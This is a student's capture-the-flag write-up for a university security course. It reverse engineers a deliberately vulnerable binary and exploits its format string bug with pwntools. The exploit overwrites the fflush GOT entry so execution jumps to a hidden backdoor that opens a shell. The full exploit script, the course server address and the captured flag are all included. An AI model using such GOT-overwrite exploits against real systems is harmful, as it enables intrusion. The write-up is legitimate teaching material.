# FSI-CTFS: FinalFormat
 
#### Exploit created by José Miguel Isidro (up202006485)
The **FinalFormat** CTF was a continuation of the format strings CTFs done in lab classes, but this was the ultimate challenge.

#### **Checksec**

Let's start by checking if the program as any security features enabled.

![](/FinalFormat/imgs/checksec.png)

The checksec returned the same as both of week #7 CTFs
- Architecture is x86
- Cannary found in the stack
- Stack doesn't have execute permissions (NX -no execute- enabled)
- No address randomization
- Regions in the memory with RWX permissions

### **Reverse Engeneering the Program** [(main.c)](/FinalFormat/main.c)
> This time, we did not have access to the program's code, contrary to our lab lessions. But using objdump and gdb, we could try to reverse engineer the program in order to find what the original code might have been.

> By perfoming the following command in bash, we can disassemble the program and find out its code and functions (output shown below)
```bash
objdump -d program
```

![](/FinalFormat/imgs/objdump_d.png)

Now, we know there is a main function with a similiar code to the last ctf challenge's function, and we also have found an old_backdoor function containing a system call to open a bash shell. So now, we have an idea of what the original code was like, and I believe it might have looked something like the following code below.

```c
#include <stdio.h>
#include <stdlib.h>

void old_backdoor() {
  puts("Backdoor activated");
  system("/bin/bash");
  return;
}

int main() {
  char buffer[60];
  
  printf("There is nothing to see here...");
  fflush(stdout);
  scanf("%32s", &buffer);
  printf("You gave me this:");
  printf(buffer);
  fflush(stdout);

  return 0;
}
```

So, as you can see, the printf call is still vulnerable to a format string attack. The main difference here is that the shellcode is no longer inside the main function and is insteade wrapped in the old_backdoor function. And the program never calls this function. So how could we access it?


We have learned with the last ctf challenge that we can write arbitrary code by abusing the printf function format string vulnerability, specifically with the help of the %n format string parameter. 
>Quoting the famous printf bugs' section of its man page:
```
"Code such as printf(foo); often indicates a bug, since foo may contain a % character.  If foo comes  from  
untrusted  user  input,  it may contain %n, causing the printf() call to write to memory and creating a security hole."
```
So now we know we can write to memory by abusing this vulnerability. But what can we do if the program never even calls the old_backdoor function?

### **Exploitation**

We will redirect the code execution to our old_backdoor function, changing the inital flow of the program. We can do this by overwriting the fflush address for the GLIBC with the address for the old_backdoor function.
> Therefore, we need to found out the fflush address for the GLIBC.

By perfoming the same command in bash as we did before, but this time using the -R (-R, --dynamic-reloc  Display the dynamic relocation entries in the file), we can find out the fflush address (output shown below)
```bash
objdump -R program
```

![](/FinalFormat/imgs/objdump_R.png)

> fflush GBLIC -> 0x0804c010

The hardest part was coming up a payload to do this, but then I found out you don't even have to write the payload yourself. With the help of the pwn library, this exploit becomes unbelievably easy! But first, let's get the last address we need with the help of gdb.


>Let's disassemble the old_backdoor function and find out its address (**WHAT** we want to write).
```gdb
disassemble old_backdoor
```

![](/FinalFormat/imgs/disas_backdoor.png)

> old_backdoor function -> 0x08049236

Now that we have our addresses, we just need to write the exploit. After searching online, I found out the [pwn](https://docs.pwntools.com/en/stable/fmtstr.html) library has some great funcions that makes this part very easy to do. But first, we'll need to find out what the offset is before we write anything to memory.
> This can be achieved with help of this [script](/FinalFormat/offset.py):

```python
from pwn import *

def exec_fmt(payload):
     p = process("./program")
     p.sendline(payload)
     return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
```
The script will then print out the offset, which in this case was 1, so I manually typed that in.

### **The Exploit** [exploit.py](/FinalFormat/exploit.py)

Now that we found out the offset, we can use the fmtstr_payload function from the pwn library to help us write our payload.
> This is the python script used for the exploit.
```python
from pwn import *

LOCAL = True

if LOCAL:
    p = process("./program")
else:
    p = remote("ctf-fsi.fe.up.pt", 4007)

what = 0x08049236 # old_backdoor function
where = 0x0804c010 # fflush@GLIBC_2.0
offset = 1

payload = fmtstr_payload(offset, {where: what})
p.recvuntil(b"...")
p.sendline(payload)
p.interactive()
```

As you can see, the 'what' and 'where' variables were used to store the addresses we found out before and the 'offset' was also used as a parameter in the **fmtstr_payload** function.
> After testing the script locally, we were granted with a shell.

![](/FinalFormat/imgs/exploit_local.png)

> Now, let's test it on the ctf server (change the LOCAL variable to False).

![](/FinalFormat/imgs/exploit_server.png)

> **SUCCESS!** We can now print the flag using /bin/cat --> flag{a48b2ab48ea9270fc5ba928b8bab50a9}